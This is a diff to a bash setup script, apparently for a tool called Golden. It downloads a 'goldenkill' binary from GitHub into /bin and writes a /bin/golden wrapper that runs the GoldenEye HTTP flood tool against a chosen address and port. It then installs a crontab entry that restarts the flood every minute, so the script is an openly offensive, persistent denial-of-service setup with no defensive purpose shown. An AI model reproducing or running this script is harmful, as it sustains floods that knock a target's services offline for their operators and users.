@@ -27,6 +27,13 @@ wget https://raw.githubusercontent.com/sons-of-liberty/Golden/main/goldenkill
 mv goldenkill /bin/goldenkill
 chmod +x /bin/goldenkill
 
+cat > /bin/golden<<EOF
+#!/bin/bash
+python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode
+
+EOF
+
+chmod +x /bin/golden
 echo -e "${RED} GoldenEye Setup Finished. ${NC}"
 clear
 echo -e "${RED} Creating Cronjob...${NC}"
@@ -38,7 +45,7 @@ function addtocrontab () {
   local job="$frequency $command"
   cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
 }
-addtocrontab "*/1 * * * *" "goldenkill; python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode"
+addtocrontab "*/1 * * * *" "goldenkill; golden"
 
 echo -e "${RED} Cronjob Created. ${NC}"
 echo -e "${RED} Setup Finished Successfully. Adios. ${NC}"
